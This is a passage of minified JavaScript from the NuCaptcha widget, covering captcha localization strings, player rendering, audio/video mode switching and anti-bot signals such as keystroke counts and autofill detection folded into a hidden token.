"_DIRECTIONS2_AUDIO[0000]_":"Burti j&#363;s dzirdat:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Ierakstiet burtus dzirdat ar audio",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},lit:{_DOWNLOAD_AUDIO_:"Parsisi&#371;sti garso i&#353;&#353;&#363;kis",_AUDIO_LISTEN_AGAIN_:"Pakartoti garso pavyzdys",_AUDIO_NEW_CHALLENGE_:"Gauti nauj&#261; i&#353;&#353;&#363;k&#303;",_REFRESH_BUTTON_:"Gauti nauj&#261; i&#353;&#353;&#363;k&#303;",_AUDIO_BUTTON_:"Gauk garso i&#353;&#353;&#363;kis",
_PLAYER_AUDIO_:"Garso i&#353;&#353;&#363;kis",_PLAYER_VIDEO_:"Vaizdo i&#353;&#353;&#363;kis","_DIRECTIONS_VERBOSE[0000]_":"&#302;veskite judan&#269;ias raides","_DIRECTIONS[0000]_":"Persik&#279;limas raides:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#302;veskite raides, kuriuos girdite &#303; audio","_DIRECTIONS_AUDIO[0000]_":"Tekstas i&#353;girsite:",_AUDIO_BUTTON_RETURN_:"Gr&#303;&#382;ti &#303; reg&#279;jimo i&#353;&#353;&#363;kis","_DIRECTIONS2[0000]_":"Persik&#279;limas raides:","_DIRECTIONS2_VERBOSE[0000]_":"&#302;veskite judan&#269;ias raides",
"_DIRECTIONS2_AUDIO[0000]_":"Tekstas i&#353;girsite:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#302;veskite raides, kuriuos girdite &#303; audio",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},"":{_DOWNLOAD_AUDIO_:"",_AUDIO_LISTEN_AGAIN_:"",_AUDIO_NEW_CHALLENGE_:"",_REFRESH_BUTTON_:"",_AUDIO_BUTTON_:"",_PLAYER_AUDIO_:"",_PLAYER_VIDEO_:"","_DIRECTIONS_VERBOSE[0000]_":"","_DIRECTIONS[0000]_":"","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"","_DIRECTIONS_AUDIO[0000]_":"",_AUDIO_BUTTON_RETURN_:"",
"_DIRECTIONS2[0000]_":"","_DIRECTIONS2_VERBOSE[0000]_":"","_DIRECTIONS2_AUDIO[0000]_":"","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""}};
function ncInitServerRequestIntercept(){if("function"===typeof window.XMLHttpRequest&&ndCaptchaAutofillSources.hasOwnProperty(ncAutofillServerKey)&&0<ndCaptchaAutofillSources[ncAutofillServerKey].length){var a="",b=XMLHttpRequest.prototype.open;try{XMLHttpRequest.prototype.open=function(){b.apply(this,arguments);a=arguments[1];ncMatchAutofillSources(ncAutofillServerKey,a)}}catch(c){}}}
function ncInitPropertyChangeEvent(a,b){try{if(null!=a)if("function"===typeof window.MutationObserver){var c=new MutationObserver(function(a){b(a,c)});c.observe(a,{childList:!0,attributes:!0,characterData:!0})}else"onpropertychange"in a&&a.attachEvent&&a.attachEvent("onpropertychange",function(a){b(a,null)})}catch(d){}}
function ncInputProfileAutofillMutationHandler(a,b){if(null!=a)if(null!=b)a.forEach(function(a){if(!0===ncMatchAutofillSources(ncAutofillPropertyKey,a.target.outerHTML))return b.disconnect(),!1});else{var c=a||window.event,c=c.target?c.target:c.srcElement;!0===ncMatchAutofillSources(ncAutofillPropertyKey,c.outerHTML)&&c.detachEvent("onpropertychange",this)}}
function ncMatchAutofillSources(a,b){var c=ncGetElement(ncTokenName);if(null!=c&&ndCaptchaAutofillSources.hasOwnProperty(a)&&0<ndCaptchaAutofillSources[a].length&&(new RegExp(ndCaptchaAutofillSources[a].join("|"),"i")).test(b)){switch(a){case ncAutofillServerKey:ncAutofillServerRequest=1;break;case ncAutofillPropertyKey:ncAutofillPropertyChange=1}c.value=ncGetSuperToken();return!0}return!1}
function ncInputProfileRegisterEventHandler(a,b,c){try{a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}catch(d){}}var ncInputProfileKeydownHandler=function(a){a=ncGetElement(ncTokenName);null!=a&&(ncKDC+=1,a.value=ncGetSuperToken())};function ncIndexOf(a,b){if(!a.indexOf){for(var c=0;c<a.length;c++)if(a[c]==b)return c;return-1}return a.indexOf(b)}function ncOnVideoClick(){}
function ncSetElementHref(a,b){null!=a&&null!=a.setAttribute&&a.setAttribute("href",b);a.href=b;return a}function ncSetElementVisible(a,b){if(null==a)return null;a.style.display=b?"block":"none";return a}function ncGetElement(a){if(""!=ncDomSuffix){var b=ncGetElementInternal(a+ncDomSuffix);if(null!=b)return b}return ncGetElementInternal(a)}function ncGetElementInternal(a){return document.getElementById?document.getElementById(a):document.all?document.all[a]:null}
function ncGetElementValue(a){a=ncGetElement(a);return null==a?"":a.value}function ncGetChildElement(a,b){if(null==a)return null;for(var c=0;c<a.childNodes.length;c++)if(a.childNodes[c].id==b||a.childNodes[c].id==b+ncDomSuffix)return a.childNodes[c];return null}
function ncRemoveElement(a,b){if(null==a)return null;if(a.removeChild){for(var c=0;c<a.childNodes.length;c++)if(a.childNodes[c].id==b||a.childNodes[c].id==b+ncDomSuffix)return a.removeChild(a.childNodes[c]);return null}document.all&&(document.all[b+ncDomSuffix]=null,document.all[b]=null);return null}function ncSafeGet(a,b,c){return null==a?c:b in a?""===a[b]?c:a[b]:c}
function ncSafeGetInt(a,b,c){"string"==typeof c&&(c=parseInt(c));return null==a?c:b in a?(a=a[b],""===a?c:"string"==typeof a?parseInt(a):a):c}function ncGetUnixTime(){return parseInt((new Date).getTime()/1E3)}function ncGetTimeMS(){return parseInt((new Date).getTime())}function ncLocText(a){var b=ncLanguage[ncPlayerModeVideo].toLowerCase();if(!(b in ncLanguageDict||(b=ncRemappedLanguage.toLowerCase(),b in ncLanguageDict)))return a;var c="_"+a+"_",b=ncLanguageDict[b];return c in b?b[c]:a}
function ncLocSecurityText(a){var b=ncLanguage[ncPlayerModeVideo].toLowerCase();if(!(b in ncLanguageDict||(b=ncRemappedLanguage.toLowerCase(),b in ncLanguageDict)))return a;var b=ncLanguageDict[b],c=-1,d=null,e=new RegExp("^_"+a+"\\[(\\d+)\\]_$","i");for(ck in b){var f=e.exec(ck);null!=f&&2==f.length&&(f=parseInt(f[1]),f>c&&f<=ncSecurityLevel&&(c=f,d=ck))}return null!=d?b[d]:a}var ncWaitForDOMCallbacks=[],ncWaitForDOMTotal=0,ncWaitForDOMTimeout=200;
function ncWaitForDOM(a){null!=a?ncWaitForDOMCallbacks.push(a):ncWaitForDOMTotal+=ncWaitForDOMTimeout;if(null!=ncGetElement(ncWidgetID)){a=ncWaitForDOMCallbacks;ncWaitForDOMCallbacks=[];try{for(var b=0;b<a.length;b++)(0,a[b])()}catch(c){ncCallRenderErrorPlayer(c.toString())}}else null!=a&&(ncWaitForDOMTotal=0,ncWaitForDOMTimeout=200),1E4>ncWaitForDOMTotal?(setTimeout("ncWaitForDOM(null)",ncWaitForDOMTimeout),ncWaitForDOMTimeout*=2):(ncWaitForDOMCallbacks=[],ncCallRenderErrorPlayer("Unable to find "+
ncWidgetID+" in DOM after "+ncWaitForDOMTotal+" ms"))}var ncInitData=null;function ncLoadPlayer(a){ncLoadPlayerExternal(a)}
function ncLoadPlayerExternal(a){ncPreviousState=ncCurrentState;ncCurrentSubState=ncCurrentState=ncStateInit;ncEnterStateTime=ncGetUnixTime();ncInitData=a;ncDomSuffix=ncSafeGet(ncInitData,"iis",ncDomSuffix);ncInitWidgetIDs(ncSafeGet(a,"widgetName","nucaptcha"));ncWaitForDOM(function(){ncWidgetElement=ncGetElement(ncWidgetID);ncWidgetContainerElement=ncGetElement(ncWidgetScriptContainerID);ncSkinElement=ncGetElement(ncSkinID);ncSaveGlobals(a);ncPlayerInitState();ncInputProfileRegisterEventHandler(ncGetElement(ncAnswerID),
"keydown",ncInputProfileKeydownHandler);ndCaptchaAutofillSources=ncSafeGet(ncInitData,"autofillsources",ndCaptchaAutofillSources);ncInitServerRequestIntercept();ncInitPropertyChangeEvent(ncGetElement(ncAnswerID),ncInputProfileAutofillMutationHandler)})}function ncInitWidgetIDs(a){ncWidgetName=a;ncScriptPlayerID=a+"-player";ncMediaObjectID=a+"-media";ncWidgetErrorID=a+"-error"}function ncNotifyWidgetLoaded(){"function"==typeof ncOnWidgetLoaded&&ncOnWidgetLoaded()}
var ncDataServer="",ncR="notset",ncHighlightAnswerBox=!1,ncIndex=0,ncPlayerTypeNoScript="NOSCRIPT",ncPlayerTypeScript="SCRIPT",ncPlayerType=ncPlayerTypeScript,ncPlayerModeAudio="AUDIO",ncPlayerModeVideo="VIDEO",ncPlayerMode=ncPlayerModeVideo,ncBrowserName="",ncPlatformName="",ncAutofocusAudioElemID="",ncEnableMediaToggle=!0,ncEnableAudioControls=!1,ncStateInit="INIT",ncStateVideo="VIDEO",ncStateAudio="AUDIO",ncPreviousState=ncStateInit,ncCurrentState=ncStateInit,ncCurrentSubState=ncStateInit,ncStateEnterTime=
0,ncToken="",ncLanguage={ncPlayerModeVideo:"eng",ncPlayerModeAudio:"eng"},ncRemappedLanguage="eng",ncVideoWidth=240,ncVideoHeight=60,ncSecurityLevel=100,ncSecurityLevelString="0100",ncWidgetError=!1,ncWidgetID="nucaptcha-widget",ncWidgetScriptContainerID="nucaptcha-widget-container",ncWidgetName="nucaptcha",ncScriptPlayerID="nucaptcha-player",ncSkinID="nucaptcha-skin",ncMediaObjectID="nucaptcha-media",ncTrackRetryID="nucaptcha-media-status",ncAnswerID="nucaptcha-answer",ncExitTimeID="nucaptcha-answer-exit",
ncEnterTimeID="nucaptcha-answer-enter",ncTokenName="nucaptcha-supertoken",ncFallbackTokenID="nucaptcha-fallback-token",ncWidgetErrorID="nucaptcha-error",ncErrorContainerID="nucaptcha-error-container",ncInputProfileID="nucaptcha-iprofile",ncEncryptedPersistentDataID="nucaptcha-epd",ncAutofillServerKey="servers",ncAutofillPropertyKey="properties",ncLastRenderTime=0,ncRetryDelay=null,ncRetryCount=0,ncAnswerTabIndex=-1,ncOrigDataServer=null,ncGifRetryCount=0,ncDisplayAudioLinks=!0,ncDisplayAudioDownload=
!0,ncButtonStates=["default","hover","active"],ncButtonToggleStates=["toggle","toggle-checked"],ncWidgetElement=null,ncWidgetContainerElement=null,ncKDC=0,ncAutofillServerRequest=0,ncAutofillPropertyChange=0,ndCaptchaAutofillSources={},ncSuperToken="",ncTrackRequestError=null,ncTrackRequestLoaded=!1,ncTrackRequestTimeout=1E4,ncTrackRequestTimeoutID=null,ncButtonAlign="right",ncDisplayFlag_Directions=1,ncDisplayFlag_DirectionsVerbose=2,ncDisplayFlag_ButtonHelp=8,ncDisplayFlag_ButtonNewChallenge=16,
ncDisplayFlag_ButtonAudioChallenge=32,ncDisplayFlags=65535,ncDomSuffix="";function ncPlayerInitState(){ncEnterState(ncPlayerMode==ncPlayerModeAudio?ncStateAudio:ncStateVideo)}function ncDisplayFlagCheck(a){return a==(ncDisplayFlags&a)}function ncDisplayFlagSet(a,b){ncDisplayFlags=0!==b?ncDisplayFlags|a:ncDisplayFlags&~a}
function ncEnterState(a){ncOnExitState(ncCurrentState,a);ncPreviousState=ncCurrentState;ncCurrentState=a;ncCurrentSubState=ncStateInit;ncEnterStateTime=ncGetUnixTime();ncOnEnterState(ncPreviousState,ncCurrentState);ncRefreshScriptPlayer()}function ncEnterSubState(a){var b=ncCurrentSubState;ncOnExitSubState(b,a);ncCurrentSubState=a;ncOnEnterSubState(b,a)}function ncOnExitState(a,b){}function ncOnEnterState(a,b){}
function ncOnEnterSubState(a,b){switch(ncCurrentState){case ncStateVideo:ncUpdateDirectionsText()}}function ncOnExitSubState(a,b){}
function ncRefreshScriptPlayer(a){try{if("undefined"!=typeof a){ncDomSuffix=a;var b=ncGetElementValue(ncTokenName);""!=b&&(ncToken=b.split("|")[0]);ncWidgetElement=ncGetElement(ncWidgetID);ncWidgetContainerElement=ncGetElement(ncWidgetScriptContainerID)}ncRemoveElement(ncWidgetContainerElement,ncScriptPlayerID);var c=ncRenderScriptPlayer();ncLastRenderTime=ncGetTimeMS();ncWidgetContainerElement.innerHTML=c+ncWidgetContainerElement.innerHTML;ncNotifyOpenSkin("EVENT_REFRESH_HTML",null);if(ncHighlightAnswerBox){var d=
ncGetElement(ncAnswerID);null!=d&&d.focus()}if(ncPlayerMode===ncPlayerModeAudio&&ncAutofocusAudioElemID){var e=ncGetElement(ncAutofocusAudioElemID);null!==e&&e.focus()}ncInputProfileRegisterEventHandler(ncGetElement(ncAnswerID),"keydown",ncInputProfileKeydownHandler);ndCaptchaAutofillSources=ncSafeGet(ncInitData,"autofillSources",ndCaptchaAutofillSources);ncInitServerRequestIntercept();ncInitPropertyChangeEvent(ncGetElement(ncAnswerID),ncInputProfileAutofillMutationHandler)}catch(f){ncCallRenderErrorPlayer(f.toString())}}
function ncNotifyOpenSkin(a,b){"undefined"!=typeof nucaptcha&&"function"==typeof nucaptcha._notifyListeners&&nucaptcha._notifyListeners(a,b)}
function ncSaveGlobals(a){ncDataServer=ncSafeGet(a,"challengeBaseUrl",ncDataServer);ncDisplayAudioDownload=ncSafeGet(a,"displayAudioDownload",ncDisplayAudioDownload);ncToken=ncSafeGet(a,"token",ncToken);ncSecurityLevel=ncSafeGet(a,"textLevel",ncSecurityLevel);ncR=ncSafeGet(a,"r",ncR);ncDomSuffix=ncSafeGet(a,"iis",ncDomSuffix);ncVideoWidth=ncSafeGet(a,"videoWidth",ncVideoWidth);ncVideoHeight=ncSafeGet(a,"videoHeight",ncVideoHeight);ncPlayerMode=ncSafeGet(a,"playerMode",ncPlayerMode);ncEnableAudioControls=
ncSafeGet(a,"enableAudioControls",ncEnableAudioControls);ncAutofocusAudioElemID=ncSafeGet(a,"autofocusAudioElemID",ncAutofocusAudioElemID);ncLanguage[ncPlayerModeVideo]=ncSafeGet(a,"lang",ncRemappedLanguage);ncLanguage[ncPlayerModeAudio]=ncSafeGet(a,"audioLang",ncRemappedLanguage);ncRemappedLanguage=ncLanguage[ncPlayerModeVideo];ncEnableMediaToggle=ncSafeGet(a,"enableMediaToggle",ncEnableMediaToggle);ncBrowserName=ncSafeGet(a,"browserName",ncBrowserName);ncPlatformName=ncSafeGet(a,"platformName",
ncPlatformName);ncAnswerID=ncSafeGet(a,"answerName",ncAnswerID);ncTokenName=ncSafeGet(a,"tokenName",ncTokenName);ncAnswerTabIndex=ncSafeGet(a,"tabIndex",ncAnswerTabIndex);0==ncEnableMediaToggle&&ncDisplayFlagSet(ncDisplayFlag_ButtonAudioChallenge,0);ncSecurityLevelString=""+ncSecurityLevel;10>ncSecurityLevel?ncSecurityLevelString="000"+ncSecurityLevelString:100>ncSecurityLevel?ncSecurityLevelString="00"+ncSecurityLevelString:1E3>ncSecurityLevel&&(ncSecurityLevelString="0"+ncSecurityLevelString)}
function ncGetCustomSWF(){return!1}function ncRenderExtDirections(a){ncRenderElementStart("label","directions-label",null,'for="'+ncAnswerID+'"');ncDisplayFlagCheck(ncDisplayFlag_Directions)&&ncRenderElementContent(a);ncRenderElementEnd()}function ncRenderExtDirectionsVerbose(a){ncRenderElementStart("label","directions-verbose-label",null,'for="'+ncAnswerID+'"');ncDisplayFlagCheck(ncDisplayFlag_DirectionsVerbose)&&ncRenderElementContent(a);ncRenderElementEnd()}
function ncRenderExtButtons(){ncDisplayFlagCheck(ncDisplayFlag_ButtonNewChallenge)&&ncRenderButton("refresh","cmd","javascript:ncCmdNewChallenge('"+ncDomSuffix+"');",ncLocText("REFRESH_BUTTON"));ncDisplayFlagCheck(ncDisplayFlag_ButtonAudioChallenge)&&ncRenderButton("audio","cmd "+ncButtonToggleStates[ncPlayerMode!=ncPlayerModeAudio?0:1],"javascript:ncCmdToggleAudio('"+ncDomSuffix+"');",ncLocText("AUDIO_BUTTON"))}
function ncRenderExtAnswerInput(a){ncGetDirectionsText();"undefined"==typeof a&&(a="");ncRenderElementInput(ncAnswerID,null,"","text","onblur=\"ncCmdLeaveAnswerBox('"+ncDomSuffix+"');\" onfocus=\"ncCmdEnterAnswerBox('"+ncDomSuffix+"');\" onchange=\"ncCmdLeaveAnswerBox('"+ncDomSuffix+"');\" onclick=\"ncCmdClickAnswerBox('"+ncDomSuffix+'\');"maxlength="64" aria-required="true" autocomplete="off"'+(0<=ncAnswerTabIndex?' tabindex="'+ncAnswerTabIndex+'"':"")+" "+a)}
function ncGetSuperToken(){return ncToken+"|"+ncIndex+"|"+ncPlayerMode+"|"+ncKDC+"|"+ncDomSuffix+"|"+ncAutofillServerRequest+"|"+ncAutofillPropertyChange}
function ncRenderExtPrivate(){ncSuperToken=ncGetSuperToken();ncRenderElementInput(ncEnterTimeID,null,null,"hidden",'value=""');ncRenderElementInput(ncExitTimeID,null,null,"hidden",'value="" onsubmit="ncCmdLeaveAnswerBox(\''+ncDomSuffix+"');\"");ncRenderElementInput(ncTokenName,null,null,"hidden",'value="'+ncSuperToken+'"');!1!==ncWidgetError&&ncRenderElementInput(ncWidgetErrorID,null,null,"hidden",'value="'+ncWidgetError+'"')}function ncRenderExtFooter(){}
function ncRenderExtMedia(){var a=ncGetDirectionsText()[1],b=ncDataServer+"?"+ncGetDataParams(),a=ncLocSecurityText(a);if(ncCurrentState==ncStateAudio){navigator.userAgent.match(/Windows Phone|iemobile/i)&&(ncPlatformName="WindowsPhone");ncDisplayAudioLinks&&("Android"!==ncPlatformName&&"iOS"!==ncPlatformName&&"WindowsPhone"!==ncPlatformName&&!1===ncEnableAudioControls&&(ncRenderElementStart("a","audio-listen-again","cmd-audio","href=\"javascript:ncCmdRefresh('"+ncDomSuffix+'\');" title="'+ncLocText("AUDIO_LISTEN_AGAIN")+
'"'),ncRenderElementContent(ncLocText("AUDIO_LISTEN_AGAIN")),ncRenderElementEnd()),ncDisplayAudioDownload&&(ncRenderElementStart("a","audio-download","cmd-audio",'href="'+b+'" title="'+ncLocText("DOWNLOAD_AUDIO")+'"'),ncRenderElementContent(ncLocText("DOWNLOAD_AUDIO")),ncRenderElementEnd()));var c=a="",d="autoplay ";if("Android"===ncPlatformName||"iOS"===ncPlatformName||"WindowsPhone"===ncPlatformName||ncEnableAudioControls)c=" controls",a=" style='width: 160px; display: block; margin:20px;'",d="";
ncRenderElementStart("audio",ncMediaObjectID,null,d+a+c);ncRenderElement("source",null,null,'src="'+b+'" type="audio/mpeg"');ncRenderElementEnd()}else ncCurrentState==ncStateVideo&&ncRenderElementGif(ncMediaObjectID,"",ncVideoWidth,ncVideoHeight,b,a,'onclick="javascript:ncOnVideoClick();"')}
function ncRenderScriptPlayer(){ncRemoveElement(ncWidgetContainerElement,ncAnswerID);ncRemoveElement(ncWidgetContainerElement,"directions-label");ncRemoveElement(ncWidgetContainerElement,"directions-verbose-label");var a=ncGetDirectionsText(),b=a[0],c=a[1],d=null,a="",e=ncGetElement("nucaptcha-template");if(null!=e)if(d=e.innerHTML,void 0!=d&&""!=d){if(-1==d.indexOf("${PlayerStart}")||-1==d.indexOf("${PlayerEnd}")||-1==d.indexOf("${Media}"))d=null,a='<div class="error">Template must contain ${PlayerStart}, ${PlayerEnd} and ${Media} variables</div>'}else d=
null,a='<div class="error">Unable to find valid template "nucaptcha-template"</div>';null==d&&(d="${PlayerStart} ${Media} ${DirectionsVerbose} ${InputAnswer} ${PlayerEnd}");var f=ncRenderGlobalClasses(),e={};e.PlayerStart='<div id="'+ncWidgetName+"-player"+ncDomSuffix+'" class="'+ncWidgetName+"-player "+f+'">\n';e.PlayerEnd="</div>\n";e.Directions='<label id="directions-label'+ncDomSuffix+'" class="directions-label">'+ncLocSecurityText(b)+"</label>";e.DirectionsVerbose='<label id="directions-verbose-label'+
ncDomSuffix+'" class="directions-verbose-label" for="'+ncAnswerID+ncDomSuffix+'">'+ncLocSecurityText(c)+"</label>";ncDisplayFlagCheck(ncDisplayFlag_ButtonNewChallenge)&&(e.CommandNewChallenge='<a id="new-challenge'+ncDomSuffix+'" title="'+ncLocText("REFRESH_BUTTON")+'" class="cmd new-challenge" href="javascript:ncCmdNewChallenge(\''+ncDomSuffix+"');\" >"+ncLocText("REFRESH_BUTTON")+"</a>");ncDisplayFlagCheck(ncDisplayFlag_ButtonAudioChallenge)?(b="AUDIO_BUTTON",ncPlayerMode===ncPlayerModeAudio&&(b=
"AUDIO_BUTTON_RETURN"),e.CommandPlayerMode='<a id="player-mode'+ncDomSuffix+'" title="'+ncLocText(b)+'" class="cmd player-mode '+ncButtonToggleStates[ncPlayerMode!=ncPlayerModeAudio?0:1]+'" href="javascript:ncCmdToggleAudio(\''+ncDomSuffix+"');\" >"+ncLocText(b)+"</a>"):e.CommandPlayerMode="";e.CommandHelp="";e.CommandErrorContainer='<div id="'+ncErrorContainerID+ncDomSuffix+'" class="error"></div>';ncRenderBegin();ncRenderElementStart("div","media-container");ncRenderExtMedia();ncRenderElementEnd();
ncRenderEnd();e.Media=ncRenderFrame.join("\n");ncRenderBegin();ncRenderExtAnswerInput();ncRenderEnd();e.InputAnswer=ncRenderFrame.join("\n");ncRenderBegin();ncRenderElementStart("div","private-container",null,null);ncRenderExtPrivate();ncRenderElementEnd();ncRenderEnd();e.PlayerEnd=ncRenderFrame.join("\n")+e.PlayerEnd;var b=d,g;for(g in e)b=b.replace(new RegExp("\\$\\{"+g+"\\}","g"),e[g]);return b+a}
function ncRenderGlobalClasses(){var a=[];a.push("wm-script");a.push("pt-"+ncPlayerType.toLowerCase());a.push("pm-"+ncPlayerMode.toLowerCase());a.push("l-"+ncLanguage[ncPlayerModeVideo].toLowerCase());return a.join(" ")}function ncRenderElementGif(a,b,c,d,e,f,g){if(void 0==g||null==g)g="";ncRenderElement("img",a,b,' onload="ncOnGifLoaded()" onerror="ncOnGifError()"  width="'+c+'"  height="'+d+'"  title="'+f+'"  src="'+e+'"  alt="NuCaptcha Media" '+g)}
function ncRenderButton(a,b,c,d){ncRenderElementStart("a",a,b+" "+ncButtonStates[0],' href="'+c+'" title="'+d+'"  onmousedown="javascript:ncButtonDown(this)" onmouseup="javascript:ncButtonUp(this)" onmouseover="javascript:ncButtonOver(this)" onmouseout="javascript:ncButtonOut(this)"');ncRenderElementContent(d);ncRenderElementEnd()}function ncRenderElementInput(a,b,c,d,e){ncRenderElementStart("input",a,b,'name="'+a+'"  title="'+c+'"  type="'+d+'" '+e);ncRenderElementEnd()}
var ncStoredRenderFrames={},ncRenderFrame=[],ncRenderStack=[],ncRenderIndent="",ncRenderIndentValue="    ";function ncRenderStateSave(){return[ncStoredRenderFrames,ncRenderFrame,ncRenderStack,ncRenderIndent]}function ncRenderStateRestore(a){ncStoredRenderFrames=a[0];ncRenderFrame=a[1];ncRenderStack=a[2];ncRenderIndex=a[3]}function ncRenderBegin(){ncStoredRenderFrames={};ncRenderFrame=[];ncRenderStack=[];ncRenderIndent=""}function ncRenderEnd(){}
function ncRenderElementStart(a,b,c,d,e){var f=[];if(null!=c){for(var g=c.split(" "),h=0;h<g.length;h++)""!=g[h]&&f.push("."+g[h]);null!=b&&-1===c.indexOf(b)&&(c+=" "+b)}else c=b;ncRenderStack.push([a,null!=b?"#"+b:"",f]);ncRenderIndent+=ncRenderIndentValue;b=null==b?"":' id="'+b+ncDomSuffix+'"';c=null==c?"":' class="'+c+'"';null!=e&&(c+=' style="'+e+'"');ncRenderFrame.push("<"+a+b+c+(null==d?"":" "+d)+" >")}
function ncRenderElement(a,b,c,d,e){ncRenderElementStart(a,b,c,d);null!=e&&ncRenderElementContent(e);ncRenderElementEnd()}function ncRenderElementContent(a){ncRenderFrame.push(ncRenderIndent+ncRenderIndentValue+a)}function ncRenderElementEnd(){ncRenderFrame.push("</"+ncRenderStack[ncRenderStack.length-1][0]+">");ncRenderStack.pop();ncRenderIndent="";for(var a=0;a<ncRenderStack.length;a++)ncRenderIndent+=ncRenderIndentValue}
function ncGetDataParams(){return"type="+ncPlayerMode+"&lang="+ncLanguage[ncPlayerMode].toLowerCase()+"&index="+ncIndex+"&token="+ncToken+"&r="+ncR+"&ptype="+ncPlayerType}function ncUpdateDirectionsText(){var a=ncGetDirectionsText(),b=ncGetElement("directions-label");null!=b&&(b.innerHTML=ncLocSecurityText(a[0]));b=ncGetElement("directions-verbose-label");null!=b&&(b.innerHTML=ncLocSecurityText(a[1]))}
function ncGetDirectionsText(){var a="DIRECTIONS",b="DIRECTIONS_VERBOSE";ncPlayerMode==ncPlayerModeAudio&&(a+="_AUDIO",b+="_AUDIO");return[a,b]}function ncFilterCmd(a){return!0}function ncCmdNewChallenge(a){!1!==ncFilterCmd("new-challenge")&&(ncIndex++,ncNotifyOpenSkin("EVENT_CMD_NEW_CHALLENGE",ncIndex),ncRefreshScriptPlayer(a))}function ncCmdRefresh(a){!1!==ncFilterCmd("refresh")&&ncRefreshScriptPlayer(a)}function ncCmdReplay(a){ncFilterCmd("replay")}
function ncCmdToggleAudio(a){if(!1!==ncFilterCmd("toggle-audio")){var b=ncPlayerModeVideo;switch(ncPlayerMode){case ncPlayerModeAudio:b=ncPlayerModeVideo;break;case ncPlayerModeVideo:b=ncPlayerModeAudio}ncCmdSetPlayerMode(b,a)}}
function ncCmdSetPlayerMode(a,b){if(!1!==ncFilterCmd("set-player-mode")){switch(a){case ncPlayerModeAudio:case ncPlayerModeVideo:break;default:a=ncPlayerModeVideo}ncPlayerMode=a;if("undefined"!=typeof b){ncDomSuffix=b;var c=ncGetElementValue(ncTokenName);""!=c&&(ncToken=c.split("|")[0]);ncWidgetElement=ncGetElement(ncWidgetID);ncWidgetContainerElement=ncGetElement(ncWidgetScriptContainerID)}ncPlayerMode==ncPlayerModeAudio?ncEnterState(ncStateAudio):ncEnterState(ncStateVideo);ncNotifyOpenSkin("EVENT_CMD_PLAYER_MODE",
ncPlayerMode)}}function ncCmdLeaveAnswerBox(a){!1!==ncFilterCmd("leave-answerbox")&&("undefined"!=typeof a&&(ncDomSuffix=a),ncGetElement(ncExitTimeID).value=ncGetUnixTime())}function ncCmdEnterAnswerBox(a){!1!==ncFilterCmd("enter-answerbox")&&("undefined"!=typeof a&&(ncDomSuffix=a),""==ncGetElement(ncEnterTimeID).value&&(ncGetElement(ncEnterTimeID).value=ncGetUnixTime()))}function ncCmdClickAnswerBox(a){ncFilterCmd("click-answerbox")}
function ncCmdError(a){ncWidgetError=a;ncPlayerType=ncPlayerTypeScript;ncRefreshScriptPlayer()}function ncSetAdservTime(a){if(""==ncAdservTransferTime){ncAdservTransferTime=""+a;var b=ncGetElement(ncAdservTransferTimeID);null!=b&&""==b.value&&(b.value=a)}}function ncSetDownloadTime(a){ncNotifyOpenSkin("EVENT_MEDIA_DOWNLOAD_COMPLETE",a)}
function ncButtonSetState(a,b,c){var d=a.className,d=d.replace(ncButtonStates[b],"");a.className=d;c&&(c=d.split(" "),c.push(ncButtonStates[b]),a.className=c.join(" "))}function ncButtonSetToggleState(a,b){var c=a.className,c=c.replace(ncButtonToggleStates[0==b?1:0],"");a.className=c+" "+ncButtonToggleStates[b]}function ncButtonDown(a){ncButtonSetState(a,2,!0)}function ncButtonUp(a){ncButtonSetState(a,2,!1);ncButtonSetState(a,1,!0)}function ncButtonOver(a){ncButtonSetState(a,1,!0)}
function ncButtonOut(a){ncButtonSetState(a,2,!1);ncButtonSetState(a,1,!1)}function ncOnGifLoaded(){ncSetDownloadTime(ncGetTimeMS()-ncLastRenderTime)}function ncOnGifError(){3>ncGifRetryCount?(ncGifRetryCount++,ncNotifyOpenSkin("EVENT_MEDIA_DOWNLOAD_RETRY",ncGifRetryCount),ncRefreshScriptPlayer()):ncNotifyOpenSkin("EVENT_MEDIA_DOWNLOAD_FAILURE",ncGifRetryCount)}
function ncCallRenderErrorPlayer(a){"function"==typeof ncRenderErrorPlayer?ncRenderErrorPlayer(a):"object"==typeof console&&"function"==typeof console.log&&console.log(a)}
var nucaptcha={_i:null,getInterface:function(a){switch(a){case 1:return this._i=this.iv1}this._throwError("Invalid interface version "+a)},_throwError:function(a){throw"NuCaptcha interface error: "+a;},_notifyListeners:function(a,b){if(null!=this._i)switch(a){case this._i.EVENT_REFRESH_HTML:this._i._notifyListeners(a,b)}},iv1:{PLAYERMODE_AUDIO:"PLAYERMODE_AUDIO",PLAYERMODE_VIDEO:"PLAYERMODE_VIDEO",ID_NUCAPTCHA_ANSWER:"nucaptcha-answer",ID_NUCAPTCHA_MEDIACONTAINER:"media-container",ID_NUCAPTCHA_MEDIASTATUS:"nucaptcha-media-status",
cmdGetANewChallenge:function(){ncCmdNewChallenge()},cmdRefreshChallenge:function(){ncCmdRefresh()},cmdShowHelp:function(){ncCmdHelp()},cmdReplay:function(){ncCmdReplay()},cmdSetPlayerMode:function(a){switch(a){case this.PLAYERMODE_VIDEO:ncCmdSetPlayerMode(ncPlayerModeVideo);break;case this.PLAYERMODE_AUDIO:ncCmdSetPlayerMode(ncPlayerModeAudio);break;default:ncCmdSetPlayerMode(ncPlayerModeVideo)}},cmdTogglePlayerMode:function(){this.cmdSetPlayerMode(this.getPlayerMode()==this.PLAYERMODE_AUDIO?this.PLAYERMODE_VIDEO:
